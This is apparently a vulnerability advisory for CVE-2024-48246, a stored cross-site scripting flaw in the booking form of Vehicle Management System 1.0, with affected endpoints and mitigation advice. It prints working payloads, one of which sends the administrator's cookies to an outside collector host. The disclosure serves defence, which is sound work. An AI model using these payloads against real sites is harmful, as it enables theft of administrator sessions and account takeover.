# CVE-2024-48246
Vehicle Management System 1.0 - Stored Cross-Site Scripting (XSS)

# Description

Vehicle Management System 1.0 contains a Stored Cross-Site Scripting (XSS) vulnerability in the Name parameter of /vehicle-management/booking.php. A malicious actor can inject malicious payloads into the Name field, which are stored and executed when an administrator views the booking list on /vehicle-management/bookinglist.php. This can lead to session hijacking or administrative account takeover.

# Affected Parameter

# Affected Endpoints

/vehicle-management/booking.php

/vehicle-management/bookinglist.php

# Vulnerability Details

Type: Cross-Site Scripting (XSS)

# Attack Vectors

Guest User Attack:

A guest user inputs a payload into the Name parameter at /vehicle-management/booking.php.
The malicious payload gets stored and executed when an admin views /vehicle-management/bookinglist.php.
Example payload for session hijacking:

```
<img src=x onerror=this.src='http://oastify.com"+document.cookie>
```

# Alert Example:

Another payload can trigger an alert or perform other malicious actions without requiring cookies:

```
<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
```

Execute arbitrary JavaScript in the context of the administratorâ€™s session.

Hijack administrator sessions via stolen cookies.

Perform unauthorized actions or escalate privileges.

# Mitigation

Sanitize and encode user input for all parameters, especially Name.

Implement a Content Security Policy (CSP) to limit script execution.

Update to a patched version if available.
